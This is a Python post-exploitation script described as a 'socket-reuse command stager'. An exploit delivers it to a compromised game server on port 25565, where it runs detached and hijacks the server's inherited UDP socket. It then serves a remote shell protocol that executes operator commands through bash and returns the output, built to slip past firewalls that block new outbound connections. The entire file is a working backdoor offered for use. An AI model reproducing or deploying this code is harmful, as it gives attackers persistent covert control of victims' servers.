# Socket-reuse command stager for the egress-sealed target.
#
# Delivered by the exploit's system() payload and run detached (setsid ... &) so it OUTLIVES the server it
# was injected into. It finds the server's UDP game socket among the file descriptors it inherited, keeps it
# bound after the server crashes (so :25565 stays ours), and serves a tiny command protocol back to the
# operator's client over that SAME socket -- which is why it works on a box that drops all new outbound:
# replies ride the established inbound 4-tuple the firewall already has state for.
#
# Protocol (UDP, on the game port): operator -> "RCESH:<shell command>"; stager runs it and streams
# "RCESH:<stdout+stderr chunk>" datagrams back, terminated by "RCESH:\x00END".
import socket, os, subprocess as sp
M = b'RCESH:'
GAME_PORT = 25565
LOG = '/tmp/.rce.log'

def log(m):
    try:
        open(LOG, 'a').write(str(m) + '\n')
    except Exception:
        pass

log('stager start pid=%d' % os.getpid())

# Find the inherited UDP socket bound to the game port -- do NOT assume a fixed fd number, it varies with how
# many files the server holds open.
def find_game_socket():
    for fd in range(3, 4096):
        try:
            os.fstat(fd)
        except OSError:
            continue
        try:
            t = socket.socket(fileno=os.dup(fd))
        except Exception:
            continue
        try:
            if t.getsockopt(socket.SOL_SOCKET, socket.SO_TYPE) == socket.SOCK_DGRAM and t.getsockname()[1] == GAME_PORT:
                log('found game socket at fd %d' % fd)
                return t
        except Exception:
            pass
        try:
            t.close()
        except Exception:
            pass
    return None

s = find_game_socket()
if s is None:
    log('NO game socket found among inherited fds -- exiting')
    os._exit(3)
s.settimeout(900)
log('serving on :%d' % GAME_PORT)
while True:
    try:
        data, addr = s.recvfrom(65535)
    except Exception as e:
        log('recv ended: %r' % e)
        break
    if not data.startswith(M):
        continue                       # ignore stray game traffic
    cmd = data[len(M):].decode('utf-8', 'replace')
    log('cmd from %r: %r' % (addr, cmd[:80]))
    try:
        r = sp.run(['/bin/bash', '-lc', cmd], capture_output=True, timeout=30)
        out = r.stdout + r.stderr
    except Exception as e:
        out = repr(e).encode()
    if not out:
        out = b'[no output]\n'
    for i in range(0, len(out), 1200):
        s.sendto(M + out[i:i+1200], addr)
    s.sendto(M + b'\x00END', addr)
